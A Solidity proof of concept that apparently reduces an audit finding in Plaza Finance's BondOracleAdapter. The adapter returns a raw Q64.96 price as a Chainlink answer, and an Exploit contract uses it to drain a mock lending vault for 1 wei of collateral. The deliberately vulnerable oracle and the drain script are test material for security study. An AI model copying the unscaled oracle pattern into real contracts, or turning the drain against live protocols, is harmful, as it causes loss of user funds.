// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Plaza Finance — BondOracleAdapter.latestRoundData returns a Q64.96 price (Sherlock H-11, issue 1016)
    SYNTHETIC, cheatcode-free reduction. The return is verbatim. The sqrt is the USDC/WETH
    observation quoted in the report (sqrtPriceX96 = 1390618563380010078436460929963734).
    A consumer that treats the answer as an 18-decimal Chainlink price lends 24.4 quote
    tokens against 1 wei of collateral. The 18-decimal price is about 3245.96. */

contract MockERC20 {
    string public symbol;
    uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _symbol, uint8 _decimals) {
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CLPool {
    // tickCumulative delta / twapInterval == 200000, the stand-in for the report's observed tick.
    function observe(uint32[] calldata) external pure returns (int56[] memory tickCumulatives, uint160[] memory) {
        tickCumulatives = new int56[](2);
        tickCumulatives[0] = 0;
        tickCumulatives[1] = 12_000_000;
        return (tickCumulatives, new uint160[](2));
    }
}

contract BondOracleAdapter {
    uint256 internal constant Q96 = 2 ** 96;
    int24 internal constant OBSERVED_TICK = 200_000;
    // sqrtPriceX96 quoted from the Polygon USDC/WETH pool in Sherlock issue 1016.
    uint160 internal constant REPORT_SQRT = 1390618563380010078436460929963734;

    CLPool public immutable dexPool;
    uint32 public twapInterval;

    constructor(CLPool _pool) {
        dexPool = _pool;
        twapInterval = 60;
    }

    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        uint32[] memory secondsAgos = new uint32[](2);
        secondsAgos[0] = twapInterval;
        secondsAgos[1] = 0;
        (int56[] memory tickCumulatives,) = dexPool.observe(secondsAgos);
        uint160 getSqrtTwapX96 = getSqrtRatioAtTick(int24((tickCumulatives[1] - tickCumulatives[0]) / int56(uint56(twapInterval))));
        return (uint80(0), int256(getPriceX96FromSqrtPriceX96(getSqrtTwapX96)), block.timestamp, block.timestamp, uint80(0)); // @> VULN: priceX96 is returned as the Chainlink answer. FIX: scale by 10**(18 + decimals1 - decimals0) first.
    }

    function getSqrtRatioAtTick(int24 tick) public pure returns (uint160) {
        require(tick == OBSERVED_TICK, "tick");
        return REPORT_SQRT;
    }

    function getPriceX96FromSqrtPriceX96(uint160 sqrtPriceX96) public pure returns (uint256) {
        return uint256(sqrtPriceX96) * uint256(sqrtPriceX96) / Q96;
    }

    // The report's conversion. USDC is 6 decimals, WETH is 18. Not used by latestRoundData.
    function fairPrice18(uint256 priceX96) public pure returns (uint256) {
        return (10 ** 30) * Q96 / priceX96;
    }
}

contract Vault {
    BondOracleAdapter public immutable oracle;
    MockERC20 public immutable quote;

    constructor(BondOracleAdapter _oracle, MockERC20 _quote) {
        oracle = _oracle;
        quote = _quote;
    }

    function borrow(uint256 collateralWei) external returns (uint256 value) {
        (, int256 answer,,,) = oracle.latestRoundData();
        value = uint256(answer) * collateralWei / 1e18;
        quote.transfer(msg.sender, value);
    }
}

contract Exploit {
    CLPool public pool; // nonce 1
    BondOracleAdapter public oracle; // nonce 2
    MockERC20 public quote; // nonce 3
    Vault public vault; // nonce 4

    constructor() {
        pool = new CLPool();
        oracle = new BondOracleAdapter(pool);
        quote = new MockERC20("USDC", 18);
        vault = new Vault(oracle, quote);
    }

    function run() external {
        (, int256 answer,,,) = oracle.latestRoundData();
        uint256 raw = uint256(answer);
        uint256 fair = oracle.fairPrice18(raw);
        require(raw == 24408239790603697707980053009065971527, "priceX96");
        require(fair == 3245959692053023671448, "fair");
        uint256 payout = raw / 1e18;
        quote.mint(address(vault), payout);
        uint256 got = vault.borrow(1);
        require(got == payout, "borrow");
        require(got == 24408239790603697707, "amount");
        require(quote.balanceOf(address(this)) == got, "profit");
        require(quote.balanceOf(address(vault)) == 0, "vault empty");
        require(got > 1 ether && fair / 1e18 == 3245, "scale");
    }
}
